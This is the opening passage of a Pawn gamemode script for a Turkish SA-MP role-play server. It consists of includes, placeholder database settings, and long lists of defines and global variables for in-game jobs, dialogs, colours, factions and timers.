/*
Phoenix Role Play 2016 Edited By Meto
*/
//--------------------------[ SCRIPT VERSION INFO ]--------------------------
#define 					SERVER_VERSION 						"v5.6.7"
#define 					TEAMSPEAK 							"samp.phoenix-roleplay.xyz"
#define 					WEBSITE 							"phoenix-roleplay.xyz"
//------------------------------[ MYSQL BÝLGÝLERÝ ]------------------------------
#define						SQL_HOST							"HOST"
#define 					SQL_USER 							"USER"
#define 					SQL_PASS 							"PASS"
#define 					SQL_DB 								"DB"
//--------------------------------[ INCLUDES ]-------------------------------
#include 					<a_samp>
#include 					<a_zones>
#include 					<streamer>
#include 					<foreach>
#include 					<progress>
#include 					<ZCMD>
#include 					<YSI/y_timers>
#include 					<yom_buttons>
#include 					<sscanf2>
#include 					<a_mysql>
#include 					<foreach>
#include                    <mSelection>
//--------------------------------[ DEFINES ]--------------------------------
#define                     MAX_GATES                           (101)
#define 					TimeFactor 							(60)
#define 					MAX_HOUSES 							(200)
#define 					MAX_BIZ 							(200)
#define                     MAX_MDS                             (100)
#define 					MAX_DMAPICONS 						(200)
#define 					MAX_DDOORS 							(1000)
#define 					INVALID_HOUSE_ID 					(-1)
#define 					INVALID_BIZ_ID 					    (0)
#define 					MAX_NOP_WARNINGS 					(4)
#define 					FACTION_PAY_PER_RANK 				(300)
#define 					MAX_PLAYERVEHICLES 					(10)
#define 					MAX_PLAYERTOYS 						(8)
#define 					MAX_ENGEL 							(100)
#define 					MAX_PLAYER_ATTOBJECTS 				(8)
#define					    MAX_OBJ 							(100000)
#define 					MAX_MODS 							(15)
#define 					MAX_DEALERSHIPVEHICLES 				(10)
#define 					MAX_CARDEALERSHIPS 					(15)
#define 					MAX_GANG_VEHICLES 					(16)
#define 					INVALID_PLAYER_VEHICLE_ID 			(0)
#define 					NEW_VULNERABLE 						(24)
#define 					TIME_TO_CLAIM 						(1)
#define 					TIME_TO_TAKEOVER 					(10)
#define 					MAX_FAMILY 							(14)
#define 					MAX_POINTS 							(9)
#define 					TEMP_RESYNC_VW 						(3453)
#define 					MAX_MODS 							(15)
#define 					MAX_BARRICADES						(10)
#define                     MAX_KUKE                            (10)
#define 					VEHICLE_RESPAWN 					(2700)
#define 					MAX_REPORTS  						(1000)
#define 					INVALID_REPORT_ID 					(-1)
#define 					REPORTSMENU 						(10031)
#define 					NOOB_SKIN 							(26)
#pragma 					dynamic 							(26384)
#define						vdolap 			 					(2042)
#define						vdolap1			 					(2043)
#define						vdolap2			 					(2044)
#define						vdolap3			 					(2045)
#define						vdolap4			 					(2046)
#define 					TRANSPARENT_VIP 					0xC93CCE00
#define 					COLOR_VIP 							0xC93CCEFF
#define 					DEDEKTIF 							1
#define 					AVUKAT 								2
#define 					HAYATKADINI 						3
#define 					UYUSTURUCUSATICISI 					4
#define 					TAMIRCI 							7
#define 					BODYGUARD 							8
#define 					SILAHSATICISI 						9
#define 					BOKSOR 								12
#define 					UYUSTURUCUKACAKCISI 				14
#define 					TAKSICI 							17
#define 					ZANAATKAR 							18
#define 					BARMEN 								19
#define 					KAMYONSOFORU 						20
#define 					PIZZACI 							21
#define 					MAX_RADAR        					20
#define 					MAX_PING 							800
#define 					MAX_YERDEKI_SILAH 					150
#define SpeedCheck(%0,%1,%2,%3,%4) floatround(floatsqroot(%4?(%0*%0+%1*%1+%2*%2):(%0*%0+%1*%1) ) *%3*1.6)
			/*  ---------------- MySQL THREADS ----------------- */
#define             		THREAD_NO_RESULT		         	(1)
#define             		THREAD_CONFIRM_USERNAME             (2)
#define 					THREAD_LOGIN_ATTEMPT 				(3)
#define             		THREAD_REGISTER_ACCOUNT         	(4)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_1     	(5)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_2     	(6)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_3     	(7)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_4     	(8)
#define             		THREAD_SAVE_ACCOUNT_CHAIN_5     	(9)
#define           		  	THREAD_SAVING_FINISHED          	(10)
#define            		 	THREAD_LOAD_P_ITEMS_CHAIN_1    		(11)
#define           		  	THREAD_OFFLINE_KILLS      		    (12)
#define            			THREAD_DELETE_PLAYER_OBJECT         (13)
#define            			THREAD_LOAD_P_ITEMS_CHAIN_2    		(14)
#define           			THREAD_CHECK_BANNED                 (15)
#define            		 	THREAD_OFFLINE_IP_CHECK             (16)
#define             		THREAD_OFFLINE_BAN                  (17)
#define            		 	THREAD_OFFLINE_WARN                 (18)
#define             		THREAD_OFFLINE_FINE                 (19)
#define             		THREAD_LOAD_P_ITEMS_CHAIN_3         (20)
#define             		THREAD_GET_STATS                    (21)
#define             		THREAD_OFFLINE_PRISON               (22)
#define             		THREAD_REFERRAL_MENU                (23)
#define             		THREAD_GIVE_REF_TOKENS              (24)
#define             		THREAD_LITERALLY_GIVE_REFTOKEN      (25)
#define             		THREAD_OFFLINE_UNINVITE             (26)
#define             		THREAD_FULLY_UNINVITE               (27)
#define             		THREAD_OFFLINE_FLAG                 (28)
#define             		THREAD_CHECK_NEW_NAME               (29)
#define             		THREAD_CONFIRMED_NAMECHANGE         (30)
#define             		THREAD_CHECK_NAME_PASSWORD          (31)
#define             		THREAD_FULLY_CHANGE_PASSWORD        (32)
#define             		THREAD_LIST_NAMECHANGES           	(33)
#define             		THREAD_OFFLINE_KILLS_2           	(34)
#define             		THREAD_MDC_CHECK           			(35)
			/*  ---------------- WALK STYLES ----------------- */
#define 					WALK_DEFAULT    					(0)
#define 					WALK_NORMAL     					(1)
#define 					WALK_PED       						(2)
#define 					WALK_GANGSTA   						(3)
#define 					WALK_GANGSTA2  						(4)
#define 					WALK_OLD       						(5)
#define 					WALK_FAT_OLD   						(6)
#define 					WALK_FAT      						(7)
#define 					WALK_LADY     						(8)
#define 					WALK_LADY2    						(9)
#define 					WALK_WHORE    						(10)
#define 					WALK_WHORE2   						(11)
#define 					WALK_DRUNK     						(12)
#define 					WALK_BLIND     						(13)
			/*  ---------------- TIMERS ----------------- */
#define						TYPE_TPMATRUNTIMER 					(1)
#define						TYPE_TPDRUGRUNTIMER 				(2)
#define						TYPE_ARMSTIMER 						(3)
#define						TYPE_GIVEWEAPONTIMER 				(4)
#define						TYPE_HOSPITALTIMER 					(5)
#define						TYPE_FLOODPROTECTION 				(7)
#define 					TYPE_GUARDTIMER 					(9)
#define						TYPE_TPTRUCKRUNTIMER 				(10)
#define 					TYPE_SELLMATSTIMER 					(12)
#define 					TYPE_TPPIZZARUNTIMER 				(13)
#define 					TYPE_PIZZATIMER 					(14)
#define						TYPE_SELLMYTIMER 					(15)
			/*  ---------------- DIALOGS ----------------- */
#define						MAINMENU 							(4070)
#define						MAINMENU2 							(4071)
#define						INFO_DIALOG 						(32767)
#define						JOBHELPMENU 						(10000)
#define						DETECTIVEJOB 						(10001)
#define						DETECTIVEJOB2 						(10002)
#define						DETECTIVEJOB3 						(10003)
#define						LAWYERJOB 							(10004)
#define						LAWYERJOB2 							(10005)
#define						LAWYERJOB3 							(10006)
#define						WHOREJOB 							(10007)
#define						WHOREJOB2 							(10008)
#define						WHOREJOB3 							(10009)
#define						DRUGDEALERJOB 						(10010)
#define						DRUGDEALERJOB2 						(10011)
#define						DRUGDEALERJOB3 						(10012)
#define						MECHANICJOB 						(10013)
#define						MECHANICJOB2 						(10014)
#define						MECHANICJOB3 						(10015)
#define						BODYGUARDJOB 						(10016)
#define						KARAKTER 							(31625)
#define					    KARAKTER2 							(31653)
#define						BODYGUARDJOB2 						(10017)
#define						BODYGUARDJOB3 						(10018)
#define						ARMSDEALERJOB 						(10019)
#define						ARMSDEALERJOB2 						(10020)
#define						ARMSDEALERJOB3 						(10021)
#define						BOXERJOB 							(10022)
#define						BOXERJOB2 							(10023)
#define						BOXERJOB3 							(10024)
#define						TAXIJOB 							(10025)
#define						TAXIJOB2 							(10026)
#define						TAXIJOB3 							(10027)
#define						SMUGGLEJOB 							(10028)
#define						SMUGGLEJOB2 						(10029)
#define						SMUGGLEJOB3 						(10030)
#define						CRAFTJOB 							(10031)
#define						BARTENDERJOB 						(10032)
#define						TRUCKERJOB 							(10033)
#define						PIZZAJOB 							(10034)
#define						DIALOG_SHOW_NAMECHANGES 			(8927)
#define						SAN_DUTYMENU 						(5510)
#define						FINDJOB 							(10035)
#define						HARITA 							    (10036)
#define						SIGNCHECK 							(6561)
#define						DIALOG_HUNT_QUESTION 				(852)
#define						DIALOG_HUNT_PRIZE 					(853)
#define						DIALOG_NAMECHANGE 					(261)
#define						DIALOG_NAMECHANGE2 					(262)
#define						DIALOG_SAN_CLOTHES 					(2289)
#define						FAMILYSKINDIALOG 					(5640)
#define						DOORLOCK 							(5000)
#define						DIALOG_CDGLOCKBUY 					(1310)
#define						DIALOG_CDGLOCKMENU 					(1309)
#define						GTRACKCAR 							(19102)
#define						FIGHTMENU 							(22222)
#define						COLORMENU 							(1111)
#define						STOREMENU 							(2449)
#define						STOREMENU2 							(2459)
#define						REGISTRATION_MENU_ONE 				(27301)
#define						REGISTRATION_MENU_TWO 				(27302)
#define						REGISTRATION_MENU_THREE 			(27303)
#define						REGISTRATION_MENU_FOUR 				(27304)
#define						REGISTRATION_MENU_FIVE 				(27305)
#define						GOVLOCKERMENU 						(4012)
#define						GOVEQUIPMENU 						(4013)
#define						GOVSKINMENU 						(4114)
#define						FINDDEALERSHIPMENU 					(4115)
#define						FINDCARTUNINGMENU 					(4116)
#define						DIALOG_ADMAIN						(32700)
#define						DIALOG_ADLIST						(32701)
#define						DIALOG_ADPLACE	 					(32702)
#define						DIALOG_ADPLACEP	 					(32703)
#define						DIALOG_ADSEARCH	 					(32704)
#define						DIALOG_ADSEARCHLIST 				(32705)
#define						DIALOG_ADFINAL	 					(32706)
#define						DIALOG_LICENSE_BUY 					(10040)
#define                     DIALOGMEGAFON                       (1236)
#define						NMUTE 								(4100)
#define						ADMUTE 								(4101)
#define						GOTOPLAYERCAR 						(19103)
#define						VEHICLESTORAGE 						(19104)
#define						REMOVEKEYS 							(4395)
#define						GIVEKEYS 							(4394)
#define						MPSPAYTICKETSCOP 					(4392)
#define						MPSPAYTICKETS 						(4393)
#define						TRACKCAR 							(19101)
#define						UNMODCARMENU 						(4388)
#define						DIALOG_CDLOCKBUY 					(1312)
#define						DIALOG_CDLOCKMENU 					(1311)
#define						DIALOG_CDGLOCKBUY 					(1310)
#define						DIALOG_CDGLOCKMENU 					(1309)
#define						DELETEPLAYERCAR 					(19110)
#define						DIALOG_REFSHOP 						(14555)
#define						TOYS 					 			(10131)
#define						DELETETOY 					 		(10132)
#define						WEARTOY 					 		(10133)
#define						BUYTOYS 					 		(10134)
#define						BUYTOYS2 					 		(10135)
#define						BUYTOYS3 					 		(10136)
#define						BUYTOYSGOLD 					 	(10137)
#define						BUYTOYSGOLD2 					 	(10138)
#define						BUYTOYSGOLD3 					 	(10139)
#define						EDITTOYS 					 		(10140)
#define						EDITTOYS2 					 		(10141)
#define						EDITTOYSBONE 					 	(10142)
/*#define					EDITTOYSPX 					 		(10143)
#define						EDITTOYSPY 					 		(10144)
#define						EDITTOYSPZ 					 		(10145)
#define						EDITTOYSRX 					 		(10146)
#define						EDITTOYSRY 					 		(10147)
#define						EDITTOYSRZ 					 		(10148)
#define						EDITTOYSSX							(30765)
#define						EDITTOYSSY							(30766)
#define						EDITTOYSSZ							(30767) */
#define						BUYTOYSCOP 					 		(10153)
#define						BUYTOYSCOP2 					 	(10154)
#define						BUYTOYSCOP3 					 	(10155)
#define						DIALOG_RADIOMENU_START 				(2800)
#define						DIALOG_RADIOMENU_SEARCH 			(2798)
#define						DIALOG_RADIOMENU_SEARCHLIST 		(2799)
#define						DIALOG_RADIOMENU_GENRE 				(2801)
#define						DIALOG_RADIOMENU_PLAY 				(2802)
#define						DIALOG_MP3_START 					(2803)
#define						DIALOG_MP3_SEARCH 					(2804)
#define						DIALOG_MP3_SEARCHLIST 				(2805)
#define						DIALOG_MP3_GENRE 					(2806)
#define						DIALOG_MP3_PLAY 					(2807)
#define						DIALOG_BOOMBOX_START 				(2808)
#define						DIALOG_BOOMBOX_SEARCH 				(2809)
#define						DIALOG_BOOMBOX_SEARCHLIST 			(2810)
#define						DIALOG_BOOMBOX_GENRE 				(2811)
#define						DIALOG_BOOMBOX_PLAY 				(2812)
#define						DIALOG_CDEDIT 						(1329)
#define						DIALOG_CDUPGRADE 					(1328)
#define						DIALOG_CDTILL 						(1327)
#define						DIALOG_CDEDITCARS 					(1326)
#define						DIALOG_CDEDITONE 					(1325)
#define						DIALOG_CDEDITMODEL 					(1324)
#define						DIALOG_CDEDITCOST 					(1323)
#define						DIALOG_CDEDITPARK 					(1322)
#define						DIALOG_CDDELVEH 					(1321)
#define						DIALOG_CDNEWVEH 					(1320)
#define						DIALOG_CDRADIUS 					(1319)
#define						DIALOG_CDNAME 						(1318)
#define						DIALOG_CDPRICE 						(1317)
#define						DIALOG_CDBUY 						(1316)
#define						DIALOG_CDWITHDRAW 					(1315)
#define						DIALOG_CDDEPOSIT 					(1314)
#define						DIALOG_CDSELL 						(1313)
#define						DUTYMENU 							(555)
#define						DUTYMENU2 							(666)
#define						DUTYMENU3 							(777)
#define						DUTYMENU4 							(888)
#define						DUTYMENU5 							(11111)
#define						FDUTYMENU 							(111)
#define						FDUTYMENU2 							(222)
#define						FDUTYMENU3 							(333)
#define						FDUTYMENU4 							(444)
#define						FDUTYMENU5 							(6666)
#define						LSFMDMENU 							(7777)
#define						LSFMDSKINS 							(9999)
#define						LSFMDGEAR 							(2000)
#define						MDC_START_ID 					 	(10098)
#define						MDC_MAIN 					 		(10099)
#define						MDC_FIND 							(10100)
#define						MDC_MEMBERS 					 	(10101)
#define						MDC_BLANK 					 		(10102)
#define						MDC_WARRANTS 					 	(10103)
#define						MDC_CHECK 					 		(10104)
#define						MDC_LICENSES 					 	(10105)
#define						MDC_LSPD 					 		(10106)
#define						MDC_SFPD 		 					(10107)
#define						MDC_FBI 		 					(10108)
#define						MDC_LSFMD 		 					(10109)
#define						MDC_MESSAGE 						(10110)
#define						MDC_SMS 		 					(10111)
#define						MDC_BOLOLIST 						(10112)
#define						MDC_ISSUE 		 					(10113)
#define						MDC_DELETE 		 					(10114)
#define						MDC_DEL_WARRANT 					(10115)
#define						MDC_DEL_BOLO 						(10116)
#define						MDC_LOGOUT 		 					(10117)
#define						MDC_CREATE 		 					(10118)
#define						MDC_CIVILIANS 						(10119)
#define						MDC_ISSUE_SLOT 					 	(10120)
#define						MDC_MESSAGE_2 						(10121)
#define						MDC_SMS_2 		 					(10122)
#define						MDC_BOLO 		 					(10123)
#define						MDC_BOLO_SLOT 						(10124)
#define						MDC_END_ID 							(10125)
#define						FMDC 								(10156)
#define						DRINKLISTDIALOG 					(10127)
#define						DRINKDIALOG 						(10128)
#define						TIPDIALOG 		 					(10129)
#define						DIALOG_LOADTRUCK 					(18301)
#define						DIALOG_LOADTRUCKL 					(18302)
#define						DIALOG_LOADTRUCKI 					(18303)
#define						SOUND_MUSIC1 		 				(1097)
#define						SOUND_OFF 		 					(1098)
#define          		    RENT_COST       					(350)
			/*  ---------------- COLORS ----------------- */
#define						TEAM_HIT_COLOR						0xFFFFFF00
#define						COLOR_GRAD1							0xB4B5B7FF
#define						COLOR_GRAD2							0xBFC0C2FF
#define						COLOR_GRAD3							0xCBCCCEFF
#define						COLOR_GRAD4							0xD8D8D8FF
#define						COLOR_GRAD5							0xE3E3E3FF
#define						COLOR_GRAD6							0xF0F0F0FF
#define						COLOR_GREY							0xAFAFAFAA
#define						COLOR_RED							0xAA3333AA
#define						COLOR_ORANGE						0xFF8000FF
#define						COLOR_YELLOW						0xFFFF00AA
#define						COLOR_FORSTATS						0xFFFF91AA
#define						COLOR_HOUSEGREEN					0x00E605AA
#define						COLOR_GREEN							0x33AA33AA
#define						COLOR_LIGHTGREEN					0x9ACD32AA
#define						COLOR_CYAN							0x40FFFFFF
#define						COLOR_PURPLE						0xC2A2DAAA
#define						COLOR_DO							0x178495AA
#define						COLOR_BLACK							0x000000AA
#define						COLOR_WHITE							0xFFFFFFAA
#define						COLOR_FADE1							0xE6E6E6E6
#define						COLOR_FADE2							0xC8C8C8C8
#define						COLOR_FADE3							0xAAAAAAAA
#define						COLOR_FADE4							0x8C8C8C8C
#define						COLOR_FADE5							0x6E6E6E6E
#define					 	COLOR_DARKRED 						0xAA3333FF
#define						COLOR_LIGHTRED						0xFF6347AA
#define						COLOR_TWWHITE						0xFFFFFFAA
#define						TEAM_NEWS_COLOR						0x049C7100
#define						COLOR_TWYELLOW						0xFFFF00AA
#define						COLOR_TWPINK						0xE75480AA
#define						COLOR_TWRED							0xFF0000AA
#define						COLOR_TWBROWN						0x654321AA
#define						COLOR_TWGRAY						0x808080AA
#define						COLOR_TWOLIVE						0x808000AA
#define						COLOR_TWPURPLE						0x800080AA
#define						COLOR_TWTAN							0xD2B48CAA
#define						COLOR_TWAQUA						0x00FFFFAA
#define						COLOR_TWORANGE						0xFF8C00AA
#define						COLOR_TWAZURE						0x007FFFAA
#define						COLOR_TWGREEN						0x008000AA
#define						COLOR_TWBLUE						0x0000FFAA
#define						COLOR_TWBLACK						0x000000AA
#define						COLOR_LIGHTBLUE						0x33CCFFAA
#define						TEAM_CYAN_COLOR						0xFF8282AA
#define						FIND_COLOR							0xB90000FF
#define						TEAM_AZTECAS_COLOR					0x01FCFFC8
#define						TEAM_TAXI_COLOR						0xF2FF0000
#define						TEAM_CYAN_COLOR						0xFF8282AA
#define						DEPTRADIO							0xFFD7004A
#define						RADIO								0x8D8DFFFF
#define						COLOR_DBLUE							0x2641FEAA
#define						COLOR_ALLDEPT						0xFF8282AA
#define						TEAM_BLUE_COLOR						0x2641FE00
#define						TEAM_FBI_COLOR						0x8D8DFF00
#define						TEAM_MED_COLOR						0xFF828200
#define						TEAM_APRISON_COLOR					0x9C791200
#define						COLOR_NG							0x9ACD3200
#define						COLOR_REPORT						0xFFFF91FF
#define						COLOR_NEWBIE						0x7DAEFFFF
#define						TEAM_ORANGE_COLOR					0xFF800000
#define						COLOR_PINK							0xFF66FFAA
#define						COLOR_OOC							0xE0FFFFAA
#define						COP_GREEN_COLOR						0x33AA33AA
#define						PUBLICRADIO_COLOR					0x6DFB6DFF
#define						TEAM_GROVE_COLOR					0x00D900C8
#define						COLOR_REALRED						0xFF0606FF
#define						TEAM_GREEN_COLOR					0xFFFFFFAA
#define						TEAM_ORANGE_COLOR					0xFF800000
#define						WANTED_COLOR						0xFF0000FF
#define						COLOR_GOV							0xE8E79BAA
			/*  ---------------- CHECKPOINTS ----------------- */
#define 					CHECKPOINT_NONE 					(0)
#define 					CHECKPOINT_HOME 					(12)
#define 					CHECKPOINT_HITMAN 					(123)
#define 					CHECKPOINT_LOADTRUCK 				(97651)
#define 					CHECKPOINT_RETURNTRUCK 				(97652)
			/*  ---------------- MISC ----------------- */
#define strcpy(%0,%1,%2) \
    strcat((%0[0] = '\0', %0), %1, %2)
#define HOLDING(%0) \
    ((newkeys & (%0)) == (%0))
#define RELEASED(%0) \
    (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
#define PRESSED(%0) \
    (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))

#define 					ini_SetString(%0,%1,%2)				if(%2[0]) fwrite(%0, %1), fputchar(%0, '=', false) && fwrite(%0, %2) && fwrite(%0, "\r\n")
#define 					ini_SetInteger(%0,%1,%2,%3)        	format(%1, sizeof(%1), "%s=%d\r\n", %2, %3) && fwrite(%0, %1)
#define 					ini_SetFloat(%0,%1,%2,%3)          	format(%1, sizeof(%1), "%s=%.0f\r\n", %2, %3) && fwrite(%0, %1)
#define 					ResetMoneyBar 						ResetPlayerMoney
#define 					UpdateMoneyBar 						GivePlayerMoney
#define 					GetPlayerCash(%0) 					PlayerInfo[%0][pCash]
#define 					GivePlayerCash(%0,%1) 				PlayerInfo[%0][pCash] += (%1)
#define 					GetVehicleName(%0) 					VehicleName[GetVehicleModel(%0)-400]
#define 					SetPVarInt(%0,%1,0); 				DeletePVar(%0,%1);

//---------------------------[ PET SÝSTEMÝ ]------------------------
#define                     PET                                9
#define                     PET2                               10
#define                     PET3                               11
#define HataMesajiYolla(%0,%1) \
	SendClientMessage(%0, -1, "{FF0000}[!]{FFFFFF} "%1)
//---------------------------[ NATIVES ]----------------------------
native 						WP_Hash(buffer[], len, const str[]);
native 						gpci(playerid, const serial[], maxlen);
//--------------------------[ VARIABLES ]---------------------------

new
	engine,
	lights,
	alarm,
	doors,
	bonnet,
	boot,
	objective
;
/*Dead body Object
new Object[MAX_PLAYERS];
*/

//new BankRobTimer[MAX_PLAYERS];
new BangaTimer[MAX_PLAYERS];
forward Banga(playerid);
new Text:MainMenuTxtdraw[12];
new Text:bilgilen;
new Text:ZhaoByMetehan0;
new Text:ZhaoByMetehan1;
new Text3D:KontrolText[MAX_PLAYERS];
new Text:ZhaoByMetehan2;
new Text:ZhaoByMetehan3;
new Text:ZhaoByMetehan4;
new Text:ZhaoByMetehan5;
new Text:ZhaoByMetehan6;
new Text:ZhaoByMetehan7;
new Text:ZhaoByMetehan8;
new Text:ZhaoByMetehan9;
new Text:ZhaoByMetehan10;
new Text:ZhaoByMetehan11;
new Text:banka0[MAX_PLAYERS];
new Text:mete0;
new Text:mete1;
new Text:mete2;
new Text:mete3;
new Text:mete4;
new Text:mete5;
new Text:mete6;
new Text:mete7;
new Text:mete8;
new Text:mete9;
new Text:mete10;
new Text:mete11;
new Text:mete12;
new Text:mete13;
new Text:TutTxtDraw[54];
new Text:ObjectsLoadingTD[7];
new Text:WristWatch;
new Text:txtAnimHelper;
new Text:GPS[MAX_PLAYERS];
new ghour = 0;
new pmokuma[MAX_PLAYERS];
new shifthour = 0;
new timeshift = 0;
new iAdverTimer;
new pointboundaries[9];
new PSeconds, PMinutes, PHours;
//new bool:flying[MAX_PLAYERS];
new PaintballTeam[MAX_PLAYERS];
new EventTeam[MAX_PLAYERS];
new PlayerDragged[MAX_PLAYERS];
new PlayerDraggedBy[MAX_PLAYERS];
new IsCopDragging[MAX_PLAYERS];
new JustSuicided[MAX_PLAYERS];
new LastSMS[MAX_PLAYERS];
new IsVehicleWindowsDown[MAX_VEHICLES]; // 0 = yes, 1 = no.
//new dildo; deaktif t/yap Beni engelleyen herhangi bir durum var mý ?
new AntiTK;
new HouseKey[MAX_PLAYERS];
new Text3D:Helper[MAX_PLAYERS];
new walktime[MAX_PLAYERS];
new TotalLogin, TotalConnect, TotalAutoBan, TotalRegister,MaxPlayersConnected,MPDay,MPMonth,MPYear,TotalUptime,PlayerCars;
new Jackpot = 0;
new HHcheckUsed = 0;
new GlobalMOTD[128];
new AdminMOTD[128];
new Lawyers = 0;
new Mechanics = 0;
new Medics = 0;
new TaxiDrivers = 0;
new BusDrivers = 0;
new nonewbie = 0;
new noooc = 1;
new nextteam;
new callcost = 1;
new cchargetime = 60;
new txtcost = 2;

new
	g_MySQLConnections[2]; // Array for future use.
new
	gaPaintballGameTimer[7],
	gaPaintballGameTimeRemaining[7],
	gaPaintballTimerHandles[7];

	
// Plaka Sistemi
new Text3D:lspdplaka; //+
new Text3D:kiraplaka;	//+
new Text3D:kamyonplaka; //+
new Text3D:fbiplaka; //+
new Text3D:govplaka; //+
new Text3D:lsfmdplaka; //+
new Text3D:taksiplaka; //
new Text3D:sanplaka; //+
new Text3D:VIPplaka; // +

new VehicleStatus[MAX_VEHICLES char] = 0; // 0 == none, 1 == vehicle dead about to respawn
new aDuty[MAX_PLAYERS];
new Bar:LoadTruckBar[MAX_PLAYERS] = INVALID_BAR_ID;
new LoadTruckTime[MAX_PLAYERS];
new TruckDeliver[MAX_PLAYERS];
new TruckUsed[MAX_PLAYERS] = INVALID_VEHICLE_ID;
new TruckContents[MAX_VEHICLES] = 0;
new FBILobbyLeft, FBILobbyLeftBTN[2], FBILobbyRight, FBILobbyRightBTN[2], FBIPrivate[2], FBIPrivateBTN[2];
new lspdcopsonly;
new lspdeveryone;
new lspddoor1;
new lspddoor2;
///////////////////////////////////////////////////////////////////////////////////////////
new oEdit[MAX_PLAYERS];
new oEditID[MAX_PLAYERS]; // Object's ID
new Float:oPos[MAX_PLAYERS][3];
new Float:oRot[MAX_PLAYERS][3];
new oldoID;
new Float:oldodX, Float:oldodY, Float:oldodZ, Float:oldodRX, Float:oldodRY, Float:oldodRZ;
////////////////////////////////////////////////////////////////////////////////////////////
new Float:Positions[14][3];
new Barricade[MAX_BARRICADES];
new Kuke[MAX_KUKE];
//new Engel[MAX_ENGEL];
new LSPDVehicles[41];
new FBIVehicles[15];
new LSFMDVehicles[44];
new SANVehicles[12];
new GovVehicles[40];
new TAXIVehicles[10];
new RentableCar[10];
new lspdsiren[5];
new lsfmdsiren[4];
new LSPDGate;
new LSPDGate2;
new FBIGate1;
new FBIGate2;
new SAHGate1;
new SAHGate2;
new LSPDGateStatus;
new LSPDGate2Status;
new FBIGate1Status;
new FBIGate2Status;
new SAHGate1Status;
new TruckerVehicles[37];
new VehicleBomb[MAX_VEHICLES char] = 0;
new PlacedVehicleBomb[MAX_PLAYERS] = INVALID_VEHICLE_ID;
new VehicleRadioStation[MAX_VEHICLES] = 0;
new vehicleMods[212][MAX_MODS][4];
new AdminRelogPassword[MAX_PLAYERS][129];
new AdminLoggedInBefore[MAX_PLAYERS];
new CreatedCars[50];
new CreatedCarsCount;
new gPlayerAccount[MAX_PLAYERS];
new gPlayerLogTries[MAX_PLAYERS];
new gPlayerLogged[MAX_PLAYERS];
//new Float:MenuTime[MAX_PLAYERS];
new InsideMainMenu[MAX_PLAYERS];
new InsideTut[MAX_PLAYERS];
new ActiveChatbox[MAX_PLAYERS];
new PlayerCuffed[MAX_PLAYERS];
new Spectate[MAX_PLAYERS];
new Spectating[MAX_PLAYERS];
new GettingSpectated[MAX_PLAYERS];
new InsideShamal[MAX_PLAYERS];
new HouseOffer[MAX_PLAYERS];
new NOPTrigger[MAX_PLAYERS];
new House[MAX_PLAYERS];
new HousePrice[MAX_PLAYERS];
new hInviteOffer[MAX_PLAYERS];
new hInviteHouse[MAX_PLAYERS];
//new hInviteSlot[MAX_PLAYERS];
new playerTabbed[MAX_PLAYERS];
new playerTabbedTime[MAX_PLAYERS];
new playerAFK[MAX_PLAYERS];
new shutdown;
new playerAFKTime[MAX_PLAYERS];
new playerLastTyped[MAX_PLAYERS];
new playerConnectedS[MAX_PLAYERS];
new playerSeconds[MAX_PLAYERS];
new pCurrentWeapon[MAX_PLAYERS];
new Float:HHcheckFloats[MAX_PLAYERS][6];
new HHcheckInt[MAX_PLAYERS];
new HHcheckVW[MAX_PLAYERS];
new gPlayerCheckpointStatus[MAX_PLAYERS];
new Float:TeleportDest[MAX_PLAYERS][3];
new Float:TeleportDest2[MAX_PLAYERS][3];
new TeleportDestInt[MAX_PLAYERS];
new TeleportDestInt2[MAX_PLAYERS];
new JetPack[MAX_PLAYERS];
new TextSpamTimes[MAX_PLAYERS];
new TextSpamUnmute[MAX_PLAYERS];
new CommandSpamTimes[MAX_PLAYERS];
new CommandSpamUnmute[MAX_PLAYERS];
new gLastCar[MAX_PLAYERS];
new GettingJob[MAX_PLAYERS];
new GettingJob2[MAX_PLAYERS];
new PayCheckCode[MAX_PLAYERS];
new AdminDuty[MAX_PLAYERS];
new FindTimePoints[MAX_PLAYERS];
new FindingPlayer[MAX_PLAYERS];
new FindTime[MAX_PLAYERS];
new UsedFind[MAX_PLAYERS];
new Condom[MAX_PLAYERS];
new SexOffer[MAX_PLAYERS];
new SexPrice[MAX_PLAYERS];
new SexWarn[MAX_PLAYERS][MAX_PLAYERS];
new textdrawscount;
new Text3D:SANews3DText;
new gFam[MAX_PLAYERS];
new InviteOffer[MAX_PLAYERS];
new InviteFaction[MAX_PLAYERS];
new InviteFamily[MAX_PLAYERS];
new LockStatus[MAX_VEHICLES];
new PotOffer[MAX_PLAYERS];
new PotPrice[MAX_PLAYERS];
new PotGram[MAX_PLAYERS];
new CrackOffer[MAX_PLAYERS];
new CrackPrice[MAX_PLAYERS];
new CrackGram[MAX_PLAYERS];
new CrackWarn[MAX_PLAYERS][MAX_PLAYERS];
new PotWarn[MAX_PLAYERS][MAX_PLAYERS];
new JobDuty[MAX_PLAYERS];
new WantLawyer[MAX_PLAYERS];
new CallLawyer[MAX_PLAYERS];
new HelperPM[MAX_PLAYERS];
new SpeakerPhone[MAX_PLAYERS];
new JailPrice[MAX_PLAYERS];
new DefendOffer[MAX_PLAYERS];
new DefendPrice[MAX_PLAYERS];
new CP[MAX_PLAYERS];
new GuardOffer[MAX_PLAYERS];
new GuardPrice[MAX_PLAYERS];
new GuardWarn[MAX_PLAYERS][MAX_PLAYERS];
new GunOffer[MAX_PLAYERS];
new GunId[MAX_PLAYERS];
new GunMats[MAX_PLAYERS];
new MatsOffer[MAX_PLAYERS];
new MatsPrice[MAX_PLAYERS];
new MatsAmount[MAX_PLAYERS];
new MatsWarn[MAX_PLAYERS][MAX_PLAYERS];
new InRing = 0;
new BoxDelay = 0;
new RoundStarted = 0;
new Boxer1 = INVALID_PLAYER_ID;
new Boxer2 = INVALID_PLAYER_ID;
new PlayerBoxing[MAX_PLAYERS];
new BoxOffer[MAX_PLAYERS];
new BoxWaitTime[MAX_PLAYERS];
new UsedWeed[MAX_PLAYERS];
new UsedCrack[MAX_PLAYERS];
new PlayerStoned[MAX_PLAYERS];
new TransportDuty[MAX_PLAYERS];
new TransportValue[MAX_PLAYERS];
new TransportMoney[MAX_PLAYERS];
new TransportTime[MAX_PLAYERS];
new TransportCost[MAX_PLAYERS];
new TransportDriver[MAX_PLAYERS];
new ConsumingMoney[MAX_PLAYERS];
new BusCallTime[MAX_PLAYERS];
new BusAccepted[MAX_PLAYERS];
